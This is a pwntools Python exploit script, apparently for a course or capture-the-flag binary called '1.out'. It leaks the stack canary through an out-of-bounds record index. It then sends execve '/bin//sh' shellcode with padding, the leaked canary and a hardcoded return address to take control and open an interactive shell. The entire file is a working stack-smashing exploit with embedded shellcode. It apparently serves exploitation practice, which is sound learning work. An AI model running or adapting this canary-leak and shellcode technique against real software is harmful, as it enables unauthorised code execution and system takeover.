#!/usr/bin/env python3

from pwn import *
import os

# -----------------------
# Config
# -----------------------
BIN_PATH = "./1.out"  # change me
context.binary = ELF(BIN_PATH, checksec=True)

context.log_level = "info"
context.terminal = ["tmux", "splitw", "-h"]

gdbscript = """
# adjust breakpoints for your binary:
break *main
#break *vuln
# continue
"""

"""
p.sendlineafter(b'>', b'something') - send a line after receiving something
p.sendline(b'something') - just send a line
p64(<int>) - pack into 8-byte int
out = p.recvline() - store line of output in variable
"""

# p = process(BIN_PATH) # use me once debugged
p = gdb.debug(BIN_PATH, gdbscript)

# your code here

p.sendline(b"1")
p.sendline(b"12")  # people[12] - canary will be pointed by people[12]->surname
p.sendline(b"A" * 9)  # overwrite the nullbyte at the beginning of canary
p.sendline(b"")
# write nothing, since calculated strings length is zero, nothing will get copied (look that part up in the 1.c)!

p.sendline(b"2")
p.sendline(b"12")  # read people[12] contents
p.recvuntil(b"NAME:")  # recvuntil to clear input buffer from previous inputs
out = p.recvuntil(b"\n")
p.recvuntil(b"SURNAME:")  # same as before
out2 = p.recvuntil(b"\n")

print(f"Leaked data: {out} and {out2}")
print("Leaked canary:")
print(b"\x00" + out2[2:9])  # apply some processing to leaked value

shellcode = b"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
ret = 0x7FFFFFFFE320  # return address
p.sendline(
    shellcode + b"A" * (72 - len(shellcode)) + b"\x00" + out2[2:9] + b"B" * 8 + p64(ret)
)
# 72 is the offset from the stack cookie
# we then append leaked stack cookie
# then 8 bytes to accomodate for saved RBP
# and overwrite return pointer
p.interactive()
